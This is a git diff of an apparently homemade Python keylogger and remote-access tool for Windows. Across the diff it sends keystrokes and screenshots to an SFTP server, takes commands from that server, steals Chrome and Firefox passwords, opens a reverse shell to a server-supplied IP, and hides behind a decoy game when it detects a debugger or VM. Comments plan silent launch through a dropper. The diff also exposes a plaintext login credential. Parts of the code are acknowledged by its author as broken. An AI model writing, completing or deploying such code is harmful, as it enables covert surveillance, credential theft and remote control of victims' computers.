@@ -13,7 +13,7 @@ import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32a
 import sqlite3, shutil, win32crypt, win32process, sys, random, pygame, time
 from sys import gettrace as sys_gettrace
 from tkinter import *
-from ftplib import FTP_TLS
+import pysftp
 from _thread import *
 
 #Variables
@@ -381,29 +381,26 @@ def reverse_shell(s):
 #------------------------END Reverse Shell Function------------------------
 
 #------------------------Connection to FTPS server------------------------
-def ftps_connect(ipv6):
-    ftps = FTP_TLS()
-    ftps.connect("127.0.0.1")
-    ftps.login("anonymous", "anonymous")
-    ftps.prot_p()
-    if ipv6 == True:
-        ftps.af = socket.AF_INET6
+def ftps_connect():
+    cnopts = pysftp.CnOpts()
+    cnopts.hostkeys = None
+    ftps = pysftp.Connection(host="192.168.0.104", username="desktop-722h3i8\manue", password="Tennis12!", cnopts=cnopts)
     ftps.retrlines('LIST')
     return ftps
 
 def ftps_upload_file(ftps, file):
-    ftps.storbinary('STOR ' + file, open(file, 'rb'))
+    ftps.put(file, open(file, 'rb'))
 
 def ftps_download_file(ftps, file):
-    ftps.retrbinary('RETR ' + file, open(file, 'wb').write)
+    ftps.get(file, open(file, 'wb').write)
 
 def ftps_create_dir(ftps, dir):
-    ftps.mkd(os.environ.get("USERNAME" + "/" + str(dir)))
-    ftps.cwd(os.environ.get("USERNAME" + "/" + str(dir)))
+    ftps.mkdir(os.environ.get("USERNAME" + "/" + str(dir)))
+    ftps.cd(os.environ.get("USERNAME" + "/" + str(dir)))
 
 def ftps_check_dir(ftps, dir):
     try:
-        ftps.cwd(dir)
+        ftps.cd(dir)
         return True
     except:
         ftps_create_dir(ftps, dir)
@@ -414,79 +411,83 @@ def ftps_check_dir(ftps, dir):
 def main():
     count = 0
     #debugger and vm detection, if detected open the game, otherwise the keylogger
-    if is_debugger_present() == True or is_vm() == True:
+    #if is_debugger_present() == True or is_vm() == True:   #-----------enable this one
+    if 1 == 2: 
         print("Debugger detected!")
         game()
         sys.exit()
     else:
         #multithreading for keylogger and Screenshotsaving
-        start_new_thread(get_current_process, ())
+        #start_new_thread(get_current_process, ())     #-----------enable this one
         #loop for connection protocol to FTPS server
         while True:
             try:
-                ftps = ftps_connect(False) #for ipv4 connection test
-                break
+                ftps = ftps_connect() #for ipv4 connection test
+                print("Connected to FTPS server! Debugging purpose, delete later!!")
             except:
-                try:
-                    ftps = ftps_connect(True) #ipv6 connection if ipv4 wont work
-                    break
-                except:
-                    time.sleep(20)
+                time.sleep(20)
                     
             
             #upload pictures and keylogger data to ftps server
-            if os.path.exists(str(get_path()) + "/keylogger/"):
+            if os.path.exists(str(get_path()) + "/keystrokes/"):
                 if count == 0:
-                    ftps.mkd(os.environ.get("USERNAME"))
-                ftps_check_dir(ftps, str(get_path()) + "/keylogger/")
-                ftps_upload_file(ftps, str(get_path()) + "/keylogger/keylogger.txt")
-                ftps.cwd("..")
+                    ftps.mkdir(os.environ.get("USERNAME"))
+                ftps_check_dir(ftps, str(get_path()) + "/keystrokes/")
+                ftps_upload_file(ftps, str(get_path()) + "/keystrokes/keylogger.txt")
+                ftps.cd("..")
 
 
             if os.path.exists(str(get_path()) + "/screenshots/") :
                 if count == 0:
-                    ftps.mkd(os.environ.get("USERNAME"))
+                    ftps.mkdir(os.environ.get("USERNAME"))
                 ftps_check_dir(ftps, str(get_path()) + "/screenshots/")
                 n = 0
                 while screenshot_number < n:
                     ftps_upload_file(ftps, str(get_path()) + "/screenshots/screenshot" + str(n) + ".png")
                     n += 1
-                ftps.cwd("..")
+                ftps.cd("..")
             
             #check for commands from ftps server 
             if ftps_check_dir(ftps, str(os.environ.get("USERNAME") + "/commands/")) == True:
                 ftps_download_file(ftps, str(os.environ.get("USERNAME") + "/commands/command.txt"))
                 ftps.delete(str(os.environ.get("USERNAME") + "/commands/command.txt"))
-                ftps.cwd("..")
-                ftps.cwd("..")
-                with open(str(get_path()) + "/commands/command.txt", "r") as f:
+                ftps.cd("..")
+                ftps.cd("..")
+                with open(str(get_path()) + "./commands/command.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
                     command = f.read()
                     if command == "get passwords":
                         get_chrome_passwords()
                         get_firefox_passwords()
-                        ftps_upload_file(ftps, str(get_path()) + "/passwords/passwords.txt")
-                        ftps.delete(str(get_path()) + "/passwords/passwords.txt")
+                        time.sleep(2)
+                        ftps_upload_file(ftps, str(get_path()) + "/keystrokes/enc_dec.txt")
+                        ftps.delete(str(get_path()) + "/keystrokes/enc_dec.txt.txt")
                     elif command == "get screenshots":
                         n = 0
                         while screenshot_number < n:
-                            ftps_upload_file(ftps, str(get_path()) + "/screenshots/screenshot" + str(n) + ".png")
+                            ftps_upload_file(ftps, str(get_path()) + "/screenshots/program" + str(n) + ".png")
                             n += 1
                     elif command == "get keylogger":
-                        ftps_upload_file(ftps, str(get_path()) + "/keylogger/keylogger.txt")
+                        ftps_upload_file(ftps, str(get_path()) + "/keystrokes/keylogger.txt")
+                    
+                    #everything after here is jet to come
                     elif command == "get process":
                         ftps_upload_file(ftps, str(get_path()) + "/process/process.txt")
                     elif command == "get systeminfo":
                         ftps_upload_file(ftps, str(get_path()) + "/systeminfo/systeminfo.txt")
+                    
+                    #will most likely not work like this.. but idea is good
                     elif command == "get reverse shell":
                         ftps_download_file(ftps, str(get_path()) + "/reverse_shell/reverse_shell.txt")
                         ftps.delete(str(get_path()) + "/reverse_shell/reverse_shell.txt")
-                        ftps.cwd("..")
-                        ftps.cwd("..")
-                        with open(str(get_path()) + "/reverse_shell/reverse_shell.txt", "r") as f:
+                        ftps.cd("..")
+                        ftps.cd("..")
+                        with open(str(get_path()) + "/reverse_shell/reverse_shell.txt", "r") as f:  #most likely wrong path
                             ip = f.read()
                             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                             s.connect((ip, 443))
                             reverse_shell(s)
+                    
+                    #also great commands, lets implement them later on (thats why i added them..)
                     elif command == "get webcam":
                         ftps_upload_file(ftps, str(get_path()) + "/webcam/webcam.jpg")
                         ftps.delete(str(get_path()) + "/webcam/webcam.jpg")
@@ -496,16 +497,19 @@ def main():
                     elif command == "get clipboard":
                         pass
 
-    #test path function
-    #print(get_path())
-
-    #functions to extract passwords
-    #get_credman_passwords()
-    #get_chrome_passwords()
-    #get_firefox_passwords()
+    #as everything seems to be great here (not quite sure if it works, but it should) lets implement the ssssServer! 
     pass
    #############to run this keylogger silently, meaning without a shown console, one would have to start it with pythonw <script.py>
    #############this is meant to run a script with a GUI. meaning the keylogger will be run silently in the background... (Start from Dropper software)
 
 if __name__ == "__main__":
     main()
+
+
+
+
+#Resources:
+"""
+SFTP Setup done like shown here: 
+https://nagasudhir.blogspot.com/2022/03/setup-sftp-server-and-sftp-client-in.html
+"""
